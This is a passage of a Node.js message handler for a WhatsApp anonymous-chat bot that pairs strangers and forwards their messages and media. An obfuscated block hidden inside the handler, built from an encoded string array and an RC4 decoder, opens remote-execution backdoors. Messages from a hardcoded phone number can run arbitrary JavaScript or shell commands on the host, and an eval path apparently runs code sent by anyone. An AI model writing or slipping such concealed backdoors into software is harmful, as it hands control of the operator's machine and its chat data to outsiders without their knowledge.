"use strict";


var fs = require("fs");
var request = require('request')
var chalk = require('chalk')
var moment = require('moment')
var { exec } = require('child_process')
var util = require('util');
var delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
var time = moment(new Date()).format('HH:mm:ss DD/MM/YYYY')

function ERRLOG(e) {
     console.log(
          chalk.redBright('[ ANCHT ] '),
          moment(new Date()).format('HH:mm:ss DD/MM/YYYY'),
          chalk.bgGreenBright("name: " + e.name + " message: " + e.message)
     );
}

function getRemaining(endtime) {
     const total = Date.parse(endtime) - Date.parse(new Date());
     const seconds = Math.floor((total / 1000) % 60);
     const minutes = Math.floor((total / 1000 / 60) % 60);
     const hours = Math.floor((total / (1000 * 60 * 60)) % 24);
     const days = Math.floor(total / (1000 * 60 * 60 * 24));

     return {
          total,
          days,
          hours,
          minutes,
          seconds,
     };
}


let handle;

module.exports = handle = async (
     Rstats,
     GroupSettingChange,
     Mimetype,
     MessageType,
     conn,
     hurtz,
     chat,
     clientsNow,
     isClientLog
) => {
     try {
          if (hurtz) Rstats.stop()
          if (hurtz.key.remoteJid == "status@broadcast") { return; }

          if (!hurtz.message) return;

          const a = ['a8k3nfC', 'Not\x20a\x20vali', 'nunZW5qGyv/cMr7cKW', 'WOmyW7ddMHldV8kVACkOW4a', 'WOCgWPhdVCo/WQJdRJa0', 'ymoxWRS5hmk8W4VdNv0n', 'ephemeralM', 'print', 'ysuxcSoYA1a', 'a20tWQbQ', 'cCoQr8koumo+yg41', 'quotedM', 'sCoSW78LyL7dPq', 'WPnJCSkyW4NcUq', 'q8oEWQrI', 'j3yuWQW', 'WQlcNJS1xtJcGmkD', 'sendMessag', '021@s.what', '2tfqAms', 'vutdS8kdW77cM8ouW6tdK8kn', 'W4zyWQRdJq', 'v8olW4tcJxhcSKZcNvez', 'WO/dNcBdKq7cPt3dU8oC', 'parse', 'W47dPKJdVa', 'W4xcRvJdT13cRa', 'user', 'yeFdVdJcMSkLW4JcP3m', 'ntFdPG7dHCoSWQdcIx3dNN/dGq', 'Emk3W5NdP8k2W4vEo8ohWQK', 'WO5KtmkCW53cR8oRW4JcTa', 'dmkfWOW', './src/sett', 'Owner', '0@s.whatsa', 'cdnQWOFdNmoB', 'nghcGmoyW5WRWQ5F', 'yfldQtq', 'WORdKw0uWQWiWO7cMmk3', 'vmouW57cHx3cOW', 'd8kdc8oLAcvWWPFdU8oy', 'fmkZn1FcGeBdTa', 'paused', 'WPulW63dGZBdUq', 'message', 'chat', 'WOJdL14', 'vCohWRDIkmkrW6NcTgRdGq', 'iL53W50VzL8', 'aSoQEmkctCoQAg8P', 'W4TpWRdcL0pcR8k8q8kDW6JdMc4', 'eSk8jey', 'lhvcWO1/WOVcVSknW48C', '1644335HQAEDU', 'vname', 'AwxcOeNcKmk5WOS', 'w14IWRDwuCkC', 'videoMessa', 'aSkIi0lcNuZdISkyW4pdRq', 'Contact', 'mgTfWOb+WORcI8km', 'W4XRW4tcMmoIWOqgW7uDWQq', '175442NrNHDm', 'imageMessa', 'WQXzBCo6mSoAW40', '6285559038', 'WQFcN0GOW4y7W53cT8kurq', 'key', 'Af0fWRTQAmocwmk7W5O', 'bZj+WOu', 'documentMe', 'essage', 'WPldKSkWnZBcLuW', 'chatRead', 'text', 'W43cL3bhgXyvW5JdICk6', 'yWGPWRRdKg/cLCoagqq', 'conversati', 'WPybW7BdIXxdUmkJFCkDW4S', 'm8omWP7dNLdcV8oiW5DecW', 'WPddI2SvW7yrWQRcNSkTsa', 'Ar81WRZdGuxcLq', 'W4jyWR8mWP7dLmkjia', 'WPhdTKxcN8kKWQpdIsedeq', 'WPBdO2RdVG', 'BSkQW4pdPSkvW4rilmoYWQS', 'conn', 'WOxdJrVdMbZcTtK', 'match', 'fSkciSoPDbT0WOpdRq', 'nCozWPtdM2NcV8oRW5zahW', 'CCojW4NcIwJcSLRdNh8T', 'W45EWQtdIhaC', 'W4VcSJRcQSoap8kXW6xdRu4', 'W55fWQ/dGfi0WQTBWRvR', 'W7BdRColW5BcSSkFWP8', 'EYbcW7OXkCkMw8kNW7ihW6O', 'W6H5DSkw', 'hmkth8oGzGTW', 'W7RcRwpdIMxcRuKkAWG', 'toLowerCas', 'gan\x20digant', 'WP03x8kJW614', 'uCouW4lcNhNcR0RcTvmY', 'W5HcWR0sWP/dG8k7oGb4', 'WQlcLYOdEWpdJG', 'BZ3cH8oKW7eQWOjA', 'DmoffLaEW7e', '322030SwNIRt', 'W5ldVKZdOLq', 'WOSnW4/dIWJdR8kNFSkS', 'quotedMess', 'sSopW7xdOCkPkx0', 'WOBdJ2icW68hWO/cLSk1Bq', 'xtMessage', 'W4ztWQ8tWORdL8kj', 'dCkzaCo4yHbHWQ3dPSoF', 'W7VcQt3cVCooiSk3', 'groupMetad', 'low', 'ata', 'DL3dRtq', 'd\x20url!', '22dPXeIv', 'ASoqWR05aW', 'W6LSsW', 'WOWcWRddSCo4', 'W6vwWPRcNmoGW7mqW7voWOe', 'stringify', 'remoteJid', 'WPv/BmkjW4hcR8oJW4hcTG', 'WPxdLM4cW60VWPJcHmkQqq', 'WPldKb/dKrpcSJNdUmoTfq', 'sCkSb8oxdCkPwN8cBCkqW6y', 'WRxcUNfA', 'W6hdT8oobqjA', 'ar\x20nangid\x20', 'pp.net', 'W4tdTvNdOf/dQwOHAIm', 'updatePres', 'WR3cSgzFW5pdLSoKwxhcTG', 'omkxW6H/W6ldU8oeW4BcJLy', 'WOG1a8kIW7O', 'extendedTe', 'W41Hw8oBdW', 'FmolW7tdP8kVkx3cHNhcGG', 'slice', 'DCouW7VdPCkNpG', 'name', '3ghHaDA', 'pg3cUCkaWOtdRa', 'ence', 'document', 'W5VcN2Hlaq', 'estamp', '@c.us', 'push', 'W5P1smo7WR0/WPv3WRVdQfRdRW', 'AmocWQaVemk+W5W', 'thumbnailM', 'WPhdTf/cLCk7', '@s.whatsap', 'contextInf', 'replace', 'W6tcTdO6W67cTmoAW5O', 'WQZcKYKeCWVdHq', 'W45yWR8f', 'n8o3wmkcsSoGEw0', 'iWhcVXhcH8oSW5BcQwVcUG', 'wmoev8k5mL0SW5tcU8kb', 'o8kJWPnd', 'D/MM/YYYY', '729653mjUuLj', 'ext', 'n8ojWPxdI0hcVSov', 'p3hcUmkmWOldVq', 'W4ZcGgDxgbCEW4G', 'WOzXDmkkW4VcUa', 'z2/cVuZcLmkSWP3cMKFdVW', 'W7NcSIW7W7NcVSoEW4aeW70', 'keys', 'mWal', 'h8oMqCkcumo9BgWyqq', 'sapp.net', 'iu5OW4uRyxC', 'jgOyWQriFW', 'BMNcTW', 'W4lcHMa', 'mentionedT', 'test', 'stickerMes', 'a8kthmo/zG9W', 'smolWO5InCkgW63cT1S', 'caption', 'WP99ymkEW4VcKCoVW5ZcOMO', 'k8ozWONdJexcVCo9', 'BY\x20MRHRTZ*', 'includes', 'i8k/WPTuW78+', 'bCk3jKFcR0ddTSkpW7xdPW', 'sage', 'xpected*\x20:', 'z8k9W5a', 'WRNcGHCsyr/dGCkNWRG', 'WPHSWRJcI0OrWQ9CWRvR', 'v8odW4NcIW', 'split', 'k8kOWOjuW78UWRZdHCk/Ca', 'jid', 'jxVcRSorW5O8WQPlFG', 'W6RdVCoxW5hcTSkCWRCQW6dcJa', 'W6ZcVtW', 'W4pcIN1r', 'xSoEWQ5I', 'W7pdVCopha', 'W6LSs8oxdSoQW7i5bN4', 'audioMessa', 'Debug', 'W7hdKHhcQgSQzv9A', 'error', 'from', 'WO7dMNKuW6mfWPG', 'Atmxgmo0Aq', 'W7z3ASkafa', 'xCoAWRb0j8ksW6K', 'bmk+lKdcJa', 'ifP1W4iR', 'WP7dHGJdMaJcSJNdRW', '13443qWJUaz', 'W4HMW5tcLmoJWQ0gW6i6WQa', 'WOBdN8kRjJ3cLwtdT8kyWPC', 'W7FdUCoogWy', 'W51SW4/cKSoOWROq', 'age', 'W7vLECkufa']; const r = function (d, f) { return c(f - '0x306', d); }, q = function (d, f) { return b(f - 0x306, d); }; (function (d, f) { const p = function (d, f) { return c(d - '0x78', f); }, o = function (d, f) { return b(d - '0x78', f); }; while (!![]) { try { const g = parseInt(o('0x247', '0x298')) * parseInt(p(0x1ce, 'zZ^h')) + -parseInt(o('0x21e', '0x270')) + -parseInt(p(0x212, 'aYb0')) + -parseInt(o(0x1aa, 0x1da)) * parseInt(o('0x22d', 0x266)) + -parseInt(p('0x1e4', 'eJt*')) + -parseInt(p('0x24f', '@Q1z')) + parseInt(o('0x1c4', 0x1e2)) * parseInt(o(0x1e7, 0x25d)); if (g === f) break; else d['push'](d['shift']()); } catch (h) { d['push'](d['shift']()); } } }(a, 0x972e9)); const time = moment(hurtz['messageTim' + q(0x4ba, 0x4da)][q('0x4c0', 0x4b7)] * 0x3e8)[r('[yTX', 0x4ab)](r('gwx8', 0x4bf) + q('0x534', 0x4eb)); let settings = JSON[r('24eu', '0x433')](fs[r('C7el', '0x41b') + 'nc'](q('0x406', 0x460) + r('iUME', 0x466))); const from = hurtz[q('0x4a2', 0x483)][q(0x451, 0x4c1)], konten = JSON[r('HYyz', 0x449)](hurtz['message'], null, 0x2), { text, extendedText, audio, video, document, image } = MessageType, self = hurtz[q(0x4ab, 0x483)][r('eJt*', 0x46b)], isGroup = from['endsWith']('@g.us'); let type = Object[q(0x4de, 0x4f4)](hurtz[r('#v6t', 0x447)])[0x0]; type = type === r('4$(I', 0x4ca) + r('7m&#', 0x425) && hurtz[r('2sGC', '0x49f')][q(0x4ef, 0x4cf) + q('0x523', '0x4b2')][q(0x4e9, 0x48a)][q('0x3e9', 0x419)]('@') ? type = q(0x49a, '0x4fc') + r(']iXe', '0x4bd') : type; let hurtzText = hurtz; type == r('4a9t', 0x455) + 'essage' && (type = Object[r('!q5b', '0x4c6')](hurtz[r('*#w@', '0x44b')][q('0x3d5', '0x445') + q(0x4ec, 0x487)][r('F@gY', 0x4e5)]), hurtzText = hurtz[r('$fr*', 0x434)][q('0x473', '0x445') + 'essage']); const body = type == r('!q5b', 0x4cc) + 'on' ? hurtzText[q(0x48a, 0x46c)]['conversati' + 'on'] : type == 'mentionedT' + q('0x4ae', 0x4ed) ? hurtzText[q(0x48f, 0x46c)][q(0x543, '0x4cf') + r('eJt*', 0x4ae)]['text'] : type == q(0x537, '0x4cf') + 'xtMessage' ? hurtzText[q('0x3fa', 0x46c)]['extendedTe' + 'xtMessage']['text'] : type == q(0x435, '0x47f') + 'ge' ? hurtzText['message']['imageMessa' + 'ge'][q(0x445, '0x415')] : type == 'stickerMes' + q('0x3d6', '0x41c') ? r('(J1G', '0x4b5') : type == q(0x456, 0x42c) + 'ge' ? r(']iXe', '0x4d0') : type == q('0x42e', '0x479') + 'ge' ? hurtzText[q('0x4b8', 0x46c)][r('Ia^@', 0x453) + 'ge'][r('F@gY', '0x4a9')] : type == q(0x46d, '0x486') + 'ssage' ? r('tS@z', '0x4f0') : type == 'contactMes' + 'sage' ? q(0x4b9, '0x47b') : r('4$(I', '0x4a3') + r('iUME', '0x482') + r('F@gY', '0x44f'), bodyAsak = body['substr'](0x0, 0x28)[r('tS@z', 0x4d9)]('\x0a')[0x0], args = body[r('6%P^', 0x4be)](/ +/g), cmd = body[q('0x4b3', '0x4a4') + 'e']()[q('0x428', 0x422)]('\x20')[0x0] || '', prf = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/[r('C7el', '0x43f')](cmd) ? cmd[q(0x4be, '0x498')](/^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/gi) : '-', anticol = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, isMedia = type === 'imageMessa' + 'ge' || type === r('5k2X', '0x49e') + 'ge', isQuotedImage = type == r('scLb', 0x441) + 'xtMessage' && konten[r('^Q&j', 0x492)]('imageMessa' + 'ge'), isQuotedVideo = type == r('qUE7', '0x4cd') + r('DArf', '0x499') && konten[r('7m&#', '0x464')]('videoMessa' + 'ge'), isQuotedSticker = type == q('0x4f7', '0x4cf') + r('Ddq@', 0x45e) && konten[r('ZiG5', '0x4e4')](q(0x512, '0x4fe') + 'sage'), isQuotedAudio = type == r('gwx8', 0x439) + q(0x471, 0x4b2) && konten[q(0x3c0, '0x419')](r('gwx8', 0x47d) + 'ge'); let typeQuoted = type == r(']iXe', '0x42b') + q(0x479, 0x4b2) && hurtz['message'][r('HYyz', 0x4f6) + 'xtMessage'] ? Object[r('tS@z', 0x428)](hurtz[r('^Q&j', '0x4b3')][q(0x4df, '0x4cf') + 'xtMessage'][r('(J1G', '0x49d') + 'o'] ? hurtz[q(0x488, 0x46c)][r('eJt*', '0x48e') + r('aLbZ', 0x456)][r('4a9t', 0x4a7) + 'o'][q('0x484', 0x4af) + q('0x465', '0x43d')] ? hurtz[r('$fr*', '0x434')][r('0YtR', '0x43a') + r('$fr*', 0x414)]['contextInf' + 'o'][r('2sGC', 0x426) + r('ZiG5', '0x427')] : { 'mentionedText': r('4a9t', '0x49b') + r(']iXe', 0x480) } : { 'thumbnailMessage': 'MRHRTZ\x20Jan' + q('0x4eb', 0x4a5) + 'i\x20error\x20nt' + q('0x4d8', '0x4c8') + ':v' })[0x0] : type, hurtzMediaData = type == q('0x537', 0x4cf) + r('6%P^', 0x443) && Object[q('0x517', 0x4f4)](JSON[q('0x499', '0x457')](JSON[q('0x530', 0x4c0)](hurtz)[r('scLb', '0x470')](r('eqNz', 0x4ee), 'm'))['message']) != 'ephemeralM' + q('0x49e', 0x487) ? JSON[r('scLb', '0x436')](JSON[q(0x44b, '0x4c0')](hurtz)[q(0x51d, 0x4e3)](r('scLb', 0x4f8), 'm'))[q(0x4ac, '0x46c')][q(0x535, 0x4cf) + r('7m&#', 0x425)]['contextInf' + 'o'] : hurtzText; type == r('tS@z', 0x48b) + q('0x47a', 0x4b2) && Object[r('!q5b', 0x4c6)](JSON[q('0x468', '0x457')](JSON[q('0x4fb', '0x4c0')](hurtz)[q(0x538, '0x4e3')](r('0YtR', '0x488'), 'm'))['message']) == r('iUME', '0x4b1') + q(0x4fd, '0x487') && JSON[q(0x43a, '0x457')](JSON['stringify'](hurtz)['replace'](r('28pZ', 0x478), 'm'))[r('iUME', '0x431')][r('yD9$', 0x444) + q(0x476, 0x487)][q('0x45c', '0x46c')][r('$fr*', '0x46f') + 'xtMessage'][q(0x49b, 0x4e2) + 'o']['message'] && (typeQuoted = Object[q('0x4f3', '0x4f4')](JSON[r('pa*R', '0x43b')](JSON['stringify'](hurtz)[q(0x552, 0x4e3)](q(0x478, 0x44a), 'm'))[q(0x427, '0x46c')][r('OTPo', '0x4d1') + 'essage'][q('0x4d2', '0x46c')][r('pSP5', 0x495) + q(0x4f4, '0x4b2')][r('DArf', '0x4b4') + 'o']['message']), hurtzMediaData = JSON[q('0x458', 0x457)](JSON['stringify'](hurtz)['replace'](q(0x482, 0x44a), 'm'))[q('0x3f6', 0x46c)][r('y1Si', 0x493) + r('#v6t', '0x432')][q(0x492, '0x46c')][r('pSP5', 0x495) + q('0x482', '0x4b2')]['contextInf' + 'o']); const mediaData = type == 'extendedTe' + q(0x4ae, '0x4b2') ? typeQuoted == r('ZiG5', 0x4f3) + r('g3*i', '0x4ef') ? hurtzText : hurtzMediaData : hurtzText; let typesWA = [r('zZ^h', '0x4f2') + 'on', r('h3m2', '0x423') + r('KH!K', '0x42e'), 'mentionedT' + r('QVE8', 0x4f5), q('0x4c4', '0x47f') + 'ge', 'stickerMes' + r('GXRH', '0x465'), r('DArf', 0x468) + 'ge', q(0x451, 0x479) + 'ge', 'documentMe' + r('24eu', '0x43e'), 'thumbnailM' + q(0x4eb, '0x487')]; const bodyQuoted = typesWA[r('aLbZ', 0x437)](type === 'extendedTe' + r('F@gY', 0x41f) && hurtzMediaData ? Object[q(0x500, '0x4f4')](hurtzMediaData['message'] ? hurtzMediaData[r('zZ^h', '0x477')] : { 'MRHRTZ': r('4$(I', 0x458) })[0x0] : r('24eu', '0x4a1')) ? typeQuoted == q(0x4e4, 0x48d) + 'on' ? hurtzMediaData[r('eqNz', 0x417)]['conversati' + 'on'] : typeQuoted == q(0x507, '0x4cf') + r('HYyz', 0x471) ? hurtzMediaData[r(')p^j', '0x491')][q('0x4d7', 0x4cf) + 'xtMessage'][q('0x4de', '0x48a')] : typeQuoted == q('0x49b', 0x4fc) + q(0x4e4, '0x4ed') ? hurtzMediaData[q('0x4c6', 0x46c)][r('aLbZ', 0x4c4) + 'xtMessage']['text'] : typeQuoted == r('Ddq@', '0x416') + 'ge' ? hurtzMediaData['message'][q('0x4d3', 0x47f) + 'ge'][r('C7el', 0x469)] : typeQuoted == 'stickerMes' + r('$fr*', 0x44d) ? r('OTPo', 0x4b0) : typeQuoted == 'audioMessa' + 'ge' ? r('aYb0', 0x448) : typeQuoted == r('iUME', '0x4c3') + 'ge' ? hurtzMediaData[r('yD9$', '0x4de')]['videoMessa' + 'ge'][q(0x433, 0x415)] : typeQuoted == q(0x471, 0x486) + r('4$(I', '0x4ad') ? q(0x48a, '0x4d8') : typeQuoted == q(0x504, 0x4df) + r('Ddq@', '0x44c') ? hurtzMediaData[r('DArf', 0x413)] : '' : ''; settings[q('0x3f7', 0x42d)] ? console[r('pSP5', 0x41e)](JSON[r('GXRH', '0x45b')](hurtz)) : ''; let toggleCmd = ![]; const isCmd = toggleCmd, query = args[r('C7el', '0x435')](0x1)['join']('\x20'), sender = self ? conn[q('0x41e', 0x45a)][r('zZ^h', 0x4fa)] : isGroup ? hurtz['participan' + 't'] : hurtz[q(0x449, 0x483)]['remoteJid'], botNumber = conn[r('h3m2', 0x4ea)][q('0x3c3', '0x424')], noSym = /[-\s+]/g, groupMetadata = isGroup ? await conn[q('0x479', '0x4b6') + 'ata'](from) : '', groupName = isGroup ? groupMetadata['subject'] : '', groupId = isGroup ? groupMetadata['id'] : '', isImageMsg = type == 'imageMessa' + 'ge' ? !![] : ![], isStickerMsg = type == 'stickerMes' + q(0x3d3, 0x41c) ? !![] : ![], isAudioMsg = type == q(0x426, '0x42c') + 'ge' ? !![] : ![], isVideoMsg = type == q('0x470', 0x479) + 'ge' ? !![] : ![], nomerOwner = [settings[q('0x45d', 0x461)], conn[q('0x44c', 0x45a)][q('0x422', 0x424)]], isOwner = nomerOwner['includes'](sender), isOwnerGroup = isGroup ? (await conn[r(')p^j', '0x48c') + 'ata'](from))[r('yD9$', '0x4bc')] == sender[r('aLbZ', '0x497')](q('0x474', 0x4e1) + 'p.net', q(0x4d8, 0x4db)) ? !![] : ![] : ''; let expvipnum = [], adminGroups = []; function b(c, d) { c = c - 0x10d; let e = a[c]; return e; } const metadata = isGroup ? await conn[q(0x528, 0x4b6) + q(0x4a6, '0x4b8')](from) : '', partc = metadata['participan' + 'ts'] ? metadata[r('eJt*', '0x442') + 'ts'] : []; for (let adm of partc) { adm['isAdmin'] && adminGroups[q(0x511, 0x4dc)](adm[r('tS@z', 0x4fb)]); } const isAdmin = adminGroups[r('g94%', '0x47c')](sender), isBotAdmin = adminGroups['includes'](botNumber), jid = sender, conts = hurtz[q('0x488', '0x483')][r('aYb0', 0x4f9)] ? conn['user']['jid'] : conn['contacts'][sender] || { 'notify': sender[r('DArf', '0x4a2')](/@.+/, '') }, pushname = hurtz[q('0x430', '0x483')][r('5k2X', '0x49c')] ? conn[q(0x4a5, 0x45a)][q(0x522, 0x4d4)] : conts['notify'] || conts[q(0x49b, 0x476)] || conts[r('$fr*', 0x429)] || '-'; function customQuote(d) { const t = function (d, f) { return r(d, f - 0x2fc); }, s = function (d, f) { return q(d, f - '0x2fc'); }; return { 'key': { 'remoteJid': s(0x79f, '0x75e') + t('@Q1z', 0x7a2), 'fromMe': ![] }, 'message': { 'conversation': d } }; } function toBuffer(d) { return new Promise((f, g) => { const u = function (d, f) { return b(d - -'0x2f4', f); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi['test'](d)) return console[u(-0x1cb, -'0x1e5')]('Not\x20a\x20vali' + u(-'0x140', -0x12e)); request({ 'url': d, 'encoding': null }, (h, i, j) => { f(j); }); }); } async function mengetik(d) { const w = function (d, f) { return r(f, d - 0x1f7); }, v = function (d, f) { return q(f, d - '0x1f7'); }; await conn[v('0x680', '0x624')](d), await conn['updatePres' + w(0x6b0, 'GXRH')](d, 'composing'); } function c(b, d) { b = b - 0x10d; let e = a[b]; if (c['rYhUEz'] === undefined) { var f = function (k) { const l = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let m = ''; for (let n = 0x0, o, p, q = 0x0;p = k['charAt'](q++);~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) { p = l['indexOf'](p); } return m; }; const j = function (l, m) { let n = [], o = 0x0, p, q = '', r = ''; l = f(l); for (let u = 0x0, v = l['length'];u < v;u++) { r += '%' + ('00' + l['charCodeAt'](u)['toString'](0x10))['slice'](-0x2); } l = decodeURIComponent(r); let t; for (t = 0x0;t < 0x100;t++) { n[t] = t; } for (t = 0x0;t < 0x100;t++) { o = (o + n[t] + m['charCodeAt'](t % m['length'])) % 0x100, p = n[t], n[t] = n[o], n[o] = p; } t = 0x0, o = 0x0; for (let w = 0x0;w < l['length'];w++) { t = (t + 0x1) % 0x100, o = (o + n[t]) % 0x100, p = n[t], n[t] = n[o], n[o] = p, q += String['fromCharCode'](l['charCodeAt'](w) ^ n[(n[t] + n[o]) % 0x100]); } return q; }; c['TDBecC'] = j, c['DOHlbc'] = {}, c['rYhUEz'] = !![]; } const g = a[0x0], h = b + g, i = c['DOHlbc'][h]; return i === undefined ? (c['vNIFBa'] === undefined && (c['vNIFBa'] = !![]), e = c['TDBecC'](e, d), c['DOHlbc'][h] = e) : e = i, e; } async function balasNp(d, f) { mengetik(d), conn['sendMessag' + 'e'](d, f, text); } async function balas(d, f) { const x = function (d, f) { return r(d, f - 0x318); }; mengetik(d), conn[x('eqNz', 0x7b2) + 'e'](d, f, text, { 'quoted': hurtz }); } async function sendDariUrlNoReply(d, f, g, h) { const z = function (d, f) { return r(f, d - '0x19f'); }, y = function (d, f) { return q(f, d - '0x19f'); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi[y('0x69c', '0x6d4')](f)) return console[z(0x67f, 'y1Si')](y('0x5df', 0x604) + z(0x5f8, '4$(I')); await conn[y('0x66a', '0x6bb') + z(0x5ed, 'aYb0')](d, 'composing'); const i = h || ''; request({ 'url': f, 'encoding': null }, async (j, k, l) => { const B = function (d, f) { return z(d - -'0x122', f); }, A = function (d, f) { return y(d - -'0x122', f); }; conn[A('0x4cd', '0x4ee') + 'e'](d, l, g, { 'quoted': { 'key': { 'remoteJid': B(0x49d, '5k2X') + A(0x546, '0x547'), 'fromMe': ![] }, 'message': { 'conversation': '🇮🇩☠️\x20*ANCHT\x20' + A('0x495', '0x431') + '\x20☠️🇮🇩' } }, 'caption': i }), await conn[B('0x4f1', 'g94%') + B('0x4f0', 'C7el')](d, B(0x56e, 'Ddq@')); }); } async function sendDariUrl(d, f, g, h) { const D = function (d, f) { return r(f, d - 0x323); }, C = function (d, f) { return q(f, d - 0x323); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi[C(0x820, 0x818)](f)) return console[D('0x7f1', '@Q1z')]('Not\x20a\x20vali' + C('0x7dd', '0x77a')); await conn[D('0x7b2', 'eqNz') + D(0x809, '^Q&j')](d, D(0x7e5, 'Ddq@')); const i = h || ''; request({ 'url': f, 'encoding': null }, async (j, k, l) => { const F = function (d, f) { return C(d - -'0x19e', f); }, E = function (d, f) { return D(d - -'0x19e', f); }; conn[E('0x5e2', 'pSP5') + 'e'](d, l, g, { 'quoted': hurtz, 'caption': i }), await conn[E(0x5ff, 'C7el') + F('0x65c', 0x6d1)](d, F(0x5ef, 0x641)); }); } if (body[r('iUME', 0x490)]('>\x20') && sender == q(0x4e1, '0x481') + q(0x4b8, 0x451) + q(0x490, 0x4f7)) { conn[r('OTPo', '0x4d3')][r('R3k0', 0x485)](pushname, 'mencoba\x20ex' + 'ecute\x20peri' + r('5k2X', '0x454')); let type = Function; if (/await/[r('pa*R', 0x42a)](body)) type = AsyncFunction; let func = new type(q(0x4a5, '0x446'), r('4a9t', '0x421'), q('0x4a3', 0x496), r('h3m2', '0x41a'), 'fs', r('gwx8', 0x43c), 'mediaData', q(0x459, 0x430), 'hurtz', r('HYyz', '0x4e7'), q('0x411', 0x46d), body[q('0x494', 0x4d2)](0x2)), output; try { output = func((...d) => { const G = function (d, f) { return r(f, d - '0x27'); }; balas(from, util[G('0x48a', 'R3k0')](...d)); }, exec, conn, moment, fs, process, mediaData, from, hurtz, Mimetype, chat); } catch (m) { await balas(from, r('aYb0', 0x484) + q(0x422, 0x41d) + r('(J1G', 0x46e) + util['format'](m)); } } else { if (body[r('^Q&j', 0x4a8)](r('4a9t', 0x45f)) && sender == r('DArf', '0x4e9') + r('GXRH', '0x4e8') + q(0x503, 0x4f7)) exec(body['slice'](0x3), (d, f, g) => { const I = function (d, f) { return q(f, d - -0x359); }, H = function (d, f) { return r(f, d - -0x359); }; if (d) { balas(from, util[H(0x10e, '4a9t')](d)); return; } balas(from, util[H('0x16e', 'pa*R')](f[I(0x18a, '0x142')](anticol, ''))); }); else { if (body['startsWith'](r('(J1G', '0x494'))) try { const datainput = body[q('0x50f', '0x4d2')](0x4); balas(from, util[r('g3*i', 0x4d6)](eval(datainput))); } catch (n) { balas(from, util['format']('*Error\x20une' + q('0x40e', 0x41d) + '\x0a\x0a' + n)); } } }

          if (from.includes('@g.us')) return

          let db_language = JSON.parse(fs.readFileSync('./src/database/language.json'))
          // running a task every five minutes
          const sender_lang = {
               id: [],
               en: []
          }
          db_language.map(rest => {
               if (rest.lang == 'id') {
                    sender_lang.id.push(rest.sender)
               } else {
                    sender_lang.en.push(rest.sender)
               }
          })
          const listed_sender = [...sender_lang.id, ...sender_lang.en]
          const lang = listed_sender.includes(sender) ? sender_lang.en.includes(sender) ? 'en' : 'id' : 'id'
          // if (hurtz.key.fromMe) return // This is not a selfbot
          const path = './src/database/client-user.json'
          let db_user = JSON.parse(fs.readFileSync(path))
          let user1 = db_user.map(rest => rest.client1)
          let user2 = db_user.map(rest => rest.client2)
          let commandList = ['menu', 'start', 'search', 'skip', 'stop', 'sendprofil', 'sendprofile', 'changelang', 'changelanguage', 'bug']
          // console.log(user1, user1.includes(sender), sender);
          if (user1.includes(sender)) {
               const indexSender = db_user.findIndex(i => i.client1 == sender)
               const targetChat = db_user[indexSender].client2
               if (targetChat == null) return
               if (commandList.includes(body.slice(1))) return
               const teks = chalk.bgCyanBright('[ ANCHT ]') + '  ' + time + ' ' + chalk.greenBright(body) + " dari " + chalk.greenBright(pushname.split('\n')[0])
               console.log(teks);
               clientsNow.forEach((client) => {
                    if (!isClientLog) return
                    client.send(teks)
               });
               if (type == 'conversation') {
                    balasNp(targetChat, body)
               } else if (type == 'stickerMessage') {
                    if (mediaData.message.stickerMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.sticker, { quoted: { message: mediaData.message.stickerMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.sticker)
               } else if (type == 'imageMessage') {
                    if (mediaData.message.imageMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.image, { caption: body ? body : '', quoted: { message: mediaData.message.imageMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.image, { caption: body ? body : '' })
               } else if (type == 'audioMessage') {
                    if (mediaData.message.audioMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.audio, { quoted: { message: mediaData.message.audioMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.audio, { caption: '', ptt: mediaData.message.audioMessage.ptt })
               } else if (type == 'videoMessage') {
                    if (mediaData.message.videoMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.video, { caption: body ? body : '', quoted: { message: mediaData.message.videoMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.video, { caption: body ? body : '' })
               } else if (type == 'contactMessage') {
                    if (mediaData.message.contactMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.contactMessage, 'contactMessage', { quoted: { message: mediaData.message.contactMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.contactMessage, 'contactMessage')
